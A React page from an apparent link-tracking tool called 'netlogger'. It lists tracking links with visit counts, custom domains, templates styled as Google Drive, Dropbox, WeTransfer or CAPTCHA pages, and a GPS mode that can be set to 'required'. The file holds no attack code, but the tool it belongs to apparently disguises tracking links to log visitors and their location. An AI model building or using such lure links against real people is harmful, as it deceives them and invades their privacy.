import { useState, useEffect, useCallback } from 'react';
import { Link, useNavigate } from 'react-router-dom';
import { getLinks, deleteLink, updateLink } from '../api/links';
import { getDomains } from '../api/domains';
import { HudPageTitle, HudPanel, HudBadge, HudButton, HudSelect } from '../components/ui/HudComponents';
import { useToast } from '../hooks/useToast';
import type { Link as LinkType, Domain } from '@netlogger/shared/types';
import { copyToClipboard } from '../utils/clipboard';

type LinkWithUrl = LinkType & { trackingUrl: string };

export default function LinksPage() {
  const [links, setLinks] = useState<LinkWithUrl[]>([]);
  const [domains, setDomains] = useState<Domain[]>([]);
  const { addToast } = useToast();
  const navigate = useNavigate();

  const loadLinks = useCallback(async () => {
    const data = await getLinks();
    setLinks(data);
  }, []);

  const loadDomains = useCallback(async () => {
    const data = await getDomains();
    setDomains(data);
  }, []);

  useEffect(() => {
    loadLinks();
    loadDomains();
  }, [loadLinks, loadDomains]);

  const handleCopy = async (link: LinkWithUrl) => {
    await copyToClipboard(link.trackingUrl);
    addToast('Tracking URL copied', 'success');
  };

  const handleToggle = async (link: LinkWithUrl) => {
    await updateLink(link.id, { isActive: !link.isActive });
    loadLinks();
  };

  const handleDelete = async (id: number) => {
    if (!confirm('Delete this link and all its visitor data?')) return;
    await deleteLink(id);
    loadLinks();
  };

  const handleDomainChange = async (link: LinkWithUrl, domainId: number | null) => {
    await updateLink(link.id, { domainId });
    loadLinks();
  };

  const activeDomains = domains.filter(d => d.isActive);

  return (
    <div className="space-y-6">
      <div className="flex items-center justify-between opacity-0 animate-hud-blink">
        <HudPageTitle>Tracking Links</HudPageTitle>
        <HudButton onClick={() => navigate('/create')} variant="primary">
          + New Link
        </HudButton>
      </div>

      <div className="grid gap-4">
        {links.map((link, i) => (
          <HudPanel key={link.id} corners animate animationDelay={Math.min(1 + i, 8)} className="p-5">
            <div className="flex items-start justify-between">
              <div className="flex-1 min-w-0">
                <div className="flex items-center gap-2 mb-1 flex-wrap">
                  <Link
                    to={`/app/links/${link.id}`}
                    className="text-lg font-mono uppercase tracking-wide text-hud-text hover:text-hud-accent transition-colors"
                  >
                    {link.title || link.slug}
                  </Link>
                  <HudBadge variant={link.templateId === 'gdrive' ? 'warning' : link.templateId === 'captcha' ? 'danger' : 'info'}>
                    {{ redirect: 'Redirect', gdrive: 'Google Drive', dropbox: 'Dropbox', captcha: 'CAPTCHA', wetransfer: 'WeTransfer' }[link.templateId] || link.templateId}
                  </HudBadge>
                  <HudBadge variant={
                    link.gpsMode === 'required' ? 'danger'
                      : link.gpsMode === 'disabled' ? 'muted'
                      : 'success'
                  }>
                    GPS: {link.gpsMode}
                  </HudBadge>
                  {!link.isActive && (
                    <HudBadge variant="danger">Disabled</HudBadge>
                  )}
                </div>
                <p className="text-sm text-hud-text-muted truncate mb-2 font-mono">
                  Target: {link.targetUrl}
                </p>
                <div className="flex items-center gap-2 mb-2">
                  <code className="text-xs bg-hud-bg px-2 py-1 font-mono text-hud-accent truncate max-w-md border border-hud-border">
                    {link.trackingUrl}
                  </code>
                  <button
                    onClick={() => handleCopy(link)}
                    className="text-hud-xs text-hud-accent hover:text-hud-accent/80 font-mono uppercase whitespace-nowrap"
                  >
                    Copy
                  </button>
                </div>
                {activeDomains.length > 0 && (
                  <div className="flex items-center gap-2">
                    <label className="text-hud-xs text-hud-text-muted font-mono uppercase">Domain:</label>
                    <select
                      value={link.domainId ?? ''}
                      onChange={(e) => {
                        const val = e.target.value;
                        handleDomainChange(link, val === '' ? null : Number(val));
                      }}
                      className="text-xs border border-hud-border bg-hud-bg px-2 py-1 text-hud-text-dim font-mono focus:outline-none focus:border-hud-accent/50"
                    >
                      <option value="">Default (server URL)</option>
                      {activeDomains.map(d => (
                        <option key={d.id} value={d.id}>{d.domain}</option>
                      ))}
                    </select>
                  </div>
                )}
              </div>
              <div className="flex items-center gap-4 ml-4">
                <div className="text-center">
                  <p className="text-2xl font-mono text-hud-accent">{link.visitCount}</p>
                  <p className="text-hud-xs text-hud-text-muted font-mono uppercase">visits</p>
                </div>
                <div className="flex gap-1">
                  <button
                    onClick={() => handleToggle(link)}
                    className={`px-3 py-1.5 text-hud-xs font-mono uppercase border transition-colors ${
                      link.isActive
                        ? 'border-hud-green/40 text-hud-green bg-hud-green/10 hover:bg-hud-green/20'
                        : 'border-hud-text-muted/40 text-hud-text-muted bg-white/5 hover:bg-white/10'
                    }`}
                  >
                    {link.isActive ? 'Active' : 'Disabled'}
                  </button>
                  <button
                    onClick={() => handleDelete(link.id)}
                    className="px-3 py-1.5 text-hud-xs font-mono uppercase text-hud-red hover:bg-hud-red/10 border border-transparent hover:border-hud-red/30 transition-colors"
                  >
                    Delete
                  </button>
                </div>
              </div>
            </div>
          </HudPanel>
        ))}
        {links.length === 0 && (
          <div className="text-center py-12 text-hud-text-muted font-mono">
            No links yet. Create your first tracking link.
          </div>
        )}
      </div>
    </div>
  );
}
